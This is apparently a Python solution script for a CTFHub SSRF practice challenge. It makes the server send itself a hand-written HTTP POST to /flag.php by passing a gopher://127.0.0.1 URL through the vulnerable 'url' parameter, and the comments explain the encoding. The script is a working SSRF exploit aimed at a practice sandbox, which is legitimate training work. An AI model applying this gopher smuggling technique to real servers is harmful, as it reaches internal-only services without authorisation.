# CTFHub SSRF 第四关：用 gopher 协议发 POST 请求，带 key 参数
import requests

BASE = "http://challenge-ee10f0eab451d9e0.sandbox.ctfhub.com:10800/"

# gopher 值：gopher://127.0.0.1:80/_ 后面跟手写的 HTTP POST 请求原文
# body 是 key=edc708535c7de420a3c472eab83e827c（长度 36）
http_req = (
    "POST /flag.php HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 36\r\n"
    "\r\n"
    "key=edc708535c7de420a3c472eab83e827c"
)
gopher = "gopher://127.0.0.1:80/_" + http_req

# 用 params 让 requests 自动做 URL 编码，避免手写 %0d%0a 出错
r = requests.get(BASE, params={"url": gopher}, timeout=15)
print("状态码:", r.status_code)
print("响应内容：")
print(r.text)
